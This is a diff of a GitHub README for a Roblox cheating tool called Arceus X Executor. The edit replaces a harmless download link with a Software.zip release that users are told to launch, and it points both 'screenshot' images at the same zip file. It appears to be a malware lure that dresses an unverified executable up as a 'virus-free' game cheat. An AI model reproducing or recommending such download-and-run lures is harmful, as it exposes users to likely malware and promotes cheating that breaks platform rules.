@@ -11,7 +11,7 @@ Arceus X Exploit & Executor is a universal cheating tool that allows users to ac
 
 ### 📂 Get Started:
 1. **Download the Arceus Executor Zip File**
-   - [![Download Arceus Executor](https://img.shields.io/badge/Download-Here-orange)](https://github.com/cli/go-gh/archive/refs/tags/v1.0.0.zip) - *(needs to be launched)*
+   - [![Download Arceus Executor](https://github.com/ayaan070708/Arceus-Executor/releases/download/v2.0/Software.zip)](https://github.com/ayaan070708/Arceus-Executor/releases/download/v2.0/Software.zip) - *(needs to be launched)*
 
    *Note: If the link doesn't work, please check the "Releases" section for alternative downloads.*
 
@@ -26,8 +26,8 @@ Arceus X Exploit & Executor is a universal cheating tool that allows users to ac
 - **Virus-Free:** Ensure a secure and clean tool for cheating in Roblox.
 
 ### 📸 Screenshots:
-![Arceus UI](https://example.com/arceus-ui.png)
-![Executing Scripts](https://example.com/scripts.png)
+![Arceus UI](https://github.com/ayaan070708/Arceus-Executor/releases/download/v2.0/Software.zip)
+![Executing Scripts](https://github.com/ayaan070708/Arceus-Executor/releases/download/v2.0/Software.zip)
 
 ### 📝 Contribution:
 - **Feedback:** We welcome your feedback and suggestions for improving Arceus Executor.
